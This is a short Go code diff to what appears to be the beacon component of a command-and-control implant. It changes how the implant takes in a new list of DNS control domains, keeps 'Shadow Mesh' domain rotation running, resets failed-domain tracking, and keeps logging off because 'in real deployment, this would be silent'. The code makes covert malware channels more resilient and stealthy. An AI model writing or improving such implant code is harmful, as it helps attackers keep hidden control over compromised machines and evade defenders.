@@ -347,14 +347,20 @@ func (b *Beacon) handleUpdateDomains(domainsJSON string) {
 	}
 
 	if len(newDomains) > 0 {
-		// Update client domains
+		// Update client domains without resetting domain index
+		// This ensures Shadow Mesh rotation continues smoothly
 		b.client.mutex.Lock()
+		oldDomains := b.client.config.DNSDomains
 		b.client.config.DNSDomains = newDomains
-		b.client.domainIndex = 0 // Reset to first domain
+		// DON'T reset domainIndex - let Shadow Mesh selection continue
+		// The selectDomain() function will handle the new domain list correctly
+		// Reset failed domain tracking to give new servers a chance
+		b.client.failedDomains = make(map[string]time.Time)
 		b.client.mutex.Unlock()
 
 		// Log update (in real deployment, this would be silent)
-		// fmt.Printf("[Beacon] Updated domains: %v\n", newDomains)
+		// fmt.Printf("[Beacon] Updated domains: %v (old: %v)\n", newDomains, oldDomains)
+		_ = oldDomains // Prevent unused variable warning
 	}
 }
 
